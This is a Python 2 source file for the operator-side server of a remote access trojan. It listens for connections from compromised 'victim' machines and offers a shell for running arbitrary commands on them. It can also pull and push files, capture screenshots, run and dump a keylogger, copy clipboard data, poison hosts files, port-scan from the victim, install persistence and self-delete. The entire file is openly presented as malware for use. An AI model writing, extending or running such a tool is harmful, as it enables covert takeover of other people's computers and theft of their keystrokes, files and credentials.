#SERVER END

import socket
import os
import random
import  string
import sys, select
import time
import threading



HOST_IP = " "    #Enter your ip here
HOST_PORT = 8080             #the port on which you want to interact


clear = lambda : os.system('clear')    #clear function
clients = []                           #Saves all the connected clients ip address and ports
socks=[]                               #saves the conn object
flag = 1


#receives the file from clients system
def send (conn , command):

    command = command[7:]
    path, name = command.rsplit('/', 1)
    conn.send(name)
    if os.path.exists(command):
        f = open(command , 'rb')
        packet = f.read(20480)
        while packet != '':
            conn.send(packet)
            packet = f.read(20480)
        conn.send( 'DONE' )
        print "[+] File uploaded"
        f.close()
    else :
        conn.send( 'Unable to upload the file' )
        print "[-] Unable to upload the file"



#sends files to the client
def receive(conn,command,name):

    conn.send(command)
    bits = conn.recv(20480)
    if not 'Unable to find out the file' in bits:
        f = open('/root/Desktop/'+name ,'wb')
        while True:
            if bits.endswith('DONE'):
                if 'screenshot'  in name :
                    print '[+] Screenshot taken '
                elif 'keylogs_dump.txt' == name:
                    print '[+] Key logs dumped'
                else :
                    print '[+] Transfer completed '
                f.close()
                break
            f.write(bits)
            bits = conn.recv(20480)
        f.close()
    else:
        print '[-] Unable to find the file'




#To accept connections from multiple clients
def accept_connections(s):
    for c in socks:
        c.close()
    del socks[:]
    del clients [:]
    global flag
    while True:
        try:
            conn, address = s.accept()
            conn.settimeout(None)
            clients.append(address)
            socks.append(conn)
            print "[+]  Connection established |  IP " + address[0]  + "   |  Port "+ str(address[1])
        except:
            print "[-] Error accepting connections "




#Interactive Shell
def shell():
    while True:
        command = raw_input("Shell >> ")

        if command == 'exit' or command == 'quit':
            global flag
            flag=0
            break
        elif command == '':
            continue
        elif command == 'list':
            list_connections()

        elif 'select' in command:
            command = command[7:]
            conn = select_target(command)
            if conn is not None:
                connect_to_target(conn,command)
        elif ('help'  == command) or ('?' == command):
            print "list        List all the currents connected clients"
            print "select      Select a given client to interact"
            print "exit/quit        Exit the shell\n"
        else:
            print("[-] Unknown command\n")



# Display current connections
def list_connections():
    result = ''
    for i,conn in enumerate(socks):
        try:
            conn.send(' ')
            conn.recv(20480)
        except:
            del socks[i]
            del clients[i]
            continue
        result += str(i) + '   ' + str(clients[i][0]) + '   ' + str(clients[i][1]) + '\n'
    print "\n------- Clients -------\n"+result




#Select target
def select_target(command):
    try:
        target = int(command)
        conn = socks[target]
        print "[+] You are now connected to "+clients[target][0]+'\n'
        return conn
    except:
        print "[-] Invalid Selection"
        return  None




#Make socket object and bind it
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST_IP,HOST_PORT))
    s.listen(128)
    accept_connections(s)




# Connect to target client and interact with it
def connect_to_target(conn,comm):
    comm = int (comm)
    while True:

        try :
            print  (clients[comm][0]) + ' >> ',
            command = raw_input()
            if command =='exit' or command=='quit' or command == 'terminate':
                conn.send('terminate')
                conn.close()
                del socks[comm]
                del clients[comm]
                break

            elif 'background' == command:
                break
            #to download a file from client end
            elif 'download' in command:
                path,name = command.split(' ')
                receive(conn,command,name)

            #takes sceenshot of the victim's screen
            elif 'screenshot' in command:
                receive(conn, command,'screenshot.jpg')

            #upload a file from server's end to client's system
            elif 'upload' in command:
                conn.send(command)
                send(conn,command)

            #handels no input condition
            elif '' == command:
                pass

            elif ('help'  == command) or ('?' == command):
                print  "quit/exit          Close the connection and go back to listener mode"
                print  "background         Go back to listener mode without closing the connection"
                print   "download          Copy a file from victim                                    (format download filename)"
                print   "screenshot        Takes screenshot of victims screen"
                print   "upload            Uploads the file to victims system                         (format upload file/to/upload)"
                print   "search            Searches the given path for a extension                    (format search path*.extension)"
                print   "scan              Scan from victims system for open ports on other systems   (format scan ip_address:port1,ports2,port3)"
                print   "DNS               Poisons the victims systems host file with given url       (format DNS url*domain)"
                print   "make persistent   Makes your malware persistent"
                print  "start keylog       Start keylogger"
                print  "dump keylog        Dump the keylogs to your desktop"
                print  "copy clipboard     Start copying clipboard data"
                print  "dump clipboard     Dump the clipboard data to your desktop"
                print  "auto kill          Delete the script and close the connection"


            elif 'start keylog' == command:
                conn.send ('start keylog')


            elif 'dump keylog' == command:
                receive(conn,command,'keylogs_dump.txt')

            elif 'copy clipboard' == command:
                conn.send('copy clipboard')
                print "[+] Clipboard copying started"

            elif 'dump clipboard' == command:
                conn.send ('dump clipboard')
                print conn.recv(20480)

             #auto delete the malware file and close the connection
            elif 'auto kill' == command:
                print "[!] Do you want to delete the malware? Connection will be lost!  (y/n)"
                ans = str(raw_input())
                if ans == 'y' or ans == 'Y':
                    conn.send('auto kill')
                    conn.close()
                    del socks[comm]
                    del clients[comm]
                    print "[+] Malware file deleted\n"
                    print "[-] Connection lost"
                    break
                else :
                    pass

            #send the command to victim's system
            else :
                conn.send( command )
                t = conn.recv(20480)
                if t == 'Command Executed':  #for commands such as mkdir which return nothing
                    print '[+] Command Executed'
                else :
                    print t     #print the result

        except:
            print "[-] Connection lost"
            break



#Create threads and manage them
def main():
    clear()
    t = threading.Thread(target=shell)
    t.daemon = True
    t.start()

    acc = threading.Thread(target=connect)
    acc.daemon = True
    acc.start()

    t.join()
    global flag
    if flag == 0:
        print "\n[+] Closing all connections\n"
        for conn in socks:
            conn.send('terminate')
            conn.close()
        time.sleep(3)
        print "[+] All connections closed\n"
        time.sleep(1)
        print "------- Exiting -------\n"
        time.sleep(1.5)
        sys.exit()
    acc.join()


main()
